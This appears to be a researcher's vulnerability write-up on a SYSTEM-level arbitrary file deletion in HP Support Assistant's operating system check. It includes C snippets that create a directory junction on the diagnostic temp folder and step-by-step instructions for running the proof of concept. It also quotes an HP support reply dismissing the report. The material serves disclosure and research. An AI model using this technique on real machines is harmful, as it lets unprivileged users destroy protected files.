# Arbitrary File Delete Elevation of Privilege in HP Support Assistant

<div>
  <table>
    <tr>
      <th colspan="2">Vulnerability Information</th>
    </tr>
    <tr>
      <td>Platform</td>
      <td>Windows 10 20H2 (OS Build 19042.1387)</td>
    </tr>
    <tr>
      <td>Vendor</td>
      <td>HP (Hewlett-Packard)</td>
    </tr>
    <tr>
      <td>Application</td>
      <td>HP Support Assistant</td>
    </tr>
    <tr>
      <td>Vulnerability Version</td>
      <td> <9.11.106.0</td>
    </tr>
    <tr>
      <td>Function</td>
      <td>Operating System Check</td>
    </tr>
    <tr>
      <td>Date of Discovery</td>
      <td>2021-12-01</td>
    </tr>
  </table>
</div>

## Description
It logs and automatically deletes diagnostic data when performing operating system scans in HP Support Assistant running with normal User privileges. At this time, if the path is manipulated through NTFS Mount Point/Directory Junction among Windows Symbolic Links, it can be abused to delete arbitrary files with `SYSTEM` privileges.

## Exploitation
When HP Support Assistant is launched, the HPSAAppLauncher process runs as a child process of the AppHelperCap service. The AppHelperCap service is a basic service provided in HP notebooks and operates with `SYSTEM` privileges. Also, if the functions provided by HP Support Assistant are performed, a new process is launched as a child process of the HPSAAppLauncher process.
HP Support Assistant provides a number of features. If you go to Fix and Diagnostics in Device Support, the operating system check function exists, and when you do that, a new process called HPOSCheck runs with `SYSTEM` privileges.

> **Process Hacker: Check process permissions**

![image](https://user-images.githubusercontent.com/44025989/207381187-5c959a87-4ae1-4468-978f-0c46da69b55e.png)</br>

During the operating system check by the HPOSCheck process, diagnostic data for BITS, Windows Update, Device Center, Maintenance, and Device are created in the following paths with `SYSTEM` privileges, respectively.

```powershell
C:\Program Files (x86)\HP\HP Support Framework\Resources\HPOSCheck\Resources\xml\BITS
C:\Program Files (x86)\HP\HP Support Framework\Resources\HPOSCheck\Resources\xml\WindowsUpdate
C:\Program Files (x86)\HP\HP Support Framework\Resources\HPOSCheck\Resources\xml\DeviceCenter
C:\Program Files (x86)\HP\HP Support Framework\Resources\HPOSCheck\Resources\xml\Maintenance
C:\Program Files (x86)\HP\HP Support Framework\Resources\HPOSCheck\Resources\xml\Device
```

The generated data is deleted immediately by automatically calling the `DeleteFileW` function, and at the same time, the diagnostic data saved for each area in the `"C:\Windows\Temp\SDIAG_Random GUID\result"` path are integrated and saved. Afterwards, when the operating system check is finished, the `"SDIAG_Random GUID"` directory created in the path is deleted calling the `DeleteFileW` function with `SYSTEM` privilege.

```C
_TCHAR tempPath[1024] = L"C:\\Windows\\Temp";

WIN32_FIND_DATA data;

HANDLE hFind = FindFirstFile(L"C:\\Windows\\Temp\\SDIAG_*", &data);
if (hFind == INVALID_HANDLE_VALUE)
{
	printf("[!] Cannot Find sdiag Directory\n");
	return 1;
}

_TCHAR* sdiagDir = L"Error";

while (FindNextFile(hFind, &data) != 0)
{
	if (wcscmp(data.cFileName, L".") == 0 || wcscmp(data.cFileName, L"..") == 0)
		continue;
	else sdiagDir = data.cFileName;
}
```

The path where the `"SDIAG_Random GUID"` directory is created has high privileges, so general users cannot access it. However, one of the HP Support Assistant features, Performance Optimization, can be used to delete files in that path.
If the `"C:\Windows\Temp"` path is empty by optimizing the performance while the operating system check is in progress, the operating system check can still have the handle. At this time, if you make a directory junction to the `"result"` directory with an arbitrary path, you can follow the link and delete the files in the target path with `SYSTEM` privilege.

```C
CreateDirectory(sdiagPath, nullptr);
CreateDirectory(fullpath, nullptr);

if (CreateDirectory(fullpath, nullptr) || (GetLastError() == ERROR_ALREADY_EXISTS))
{
	if (!ReparsePoint::CreateMountPoint(fullpath, argv[1], argc > 2 ? argv[2] : L""))
	{
	printf("[!] Error creating mount point - %ls\n", GetErrorMessage().c_str());
		return 1;
	}
}
else
{
	printf("[!] Error creating directory - %ls\n", GetErrorMessage().c_str());
}
```

## Conclusion
1. After verifying user information, start HP Support Assistant.
2. Go to Device Support, then select Fixes and Diagnostics.
3. Run an operating system check.
4. Perform PoC in the format of `HPOSCheck_PoC.exe [target dir]`.
5. When the message `"Start Optimize performance without additional options and press ENTER"` appears, run performance optimization and press ENTER.
6. When the PoC ends with the phrase `"Now Close the operating system check window!!!"`, the operating system check ends.

### Proof of Concept

![image](https://user-images.githubusercontent.com/44025989/207381332-e1bfb343-3d91-4733-9be9-da443ac7d326.png)</br>

### Demo
[![Video Label](http://img.youtube.com/vi/DeQCBZQaGVo/0.jpg)](https://youtu.be/DeQCBZQaGVo)

<!-- ### Countermeasures
When performing operating system checks in HP Support Assistant running with normal user privileges, the `ReparseTag` must be checked internally when the `DeleteFileW` function is called.
-->

## Reference
* **[symboliclink-testing-tools, Developed by James Forshaw](https://github.com/googleprojectzero/symboliclink-testing-tools.git)**

## Why Stolen: Mailboxes received from HP after reporting vulnerabilities
### 📩 Hello, HP. HP Support Assistant
> **Jin, Mingzhou (CCC Dalian Korea)** `mingzhou.jin@hp.com`</br>
> 2022. 01. 18. PM 12:05
```
Hello.
Case number : 5078475116
Regarding HP Support Assistant, the HP team will confirm and respond to you.

HP Support Assistant has been fully vetted by HP Cybersecurity and has responded with no flags and no issues.

Please note.

thank you
Myung Joo Kim regards
Mingzhou, Jin
CCC Dalian Korea
mingzhou.jin@hp.com
Hewlett-Packard Company
PPS CSS CDCD PS Korea Operation Support Team
```
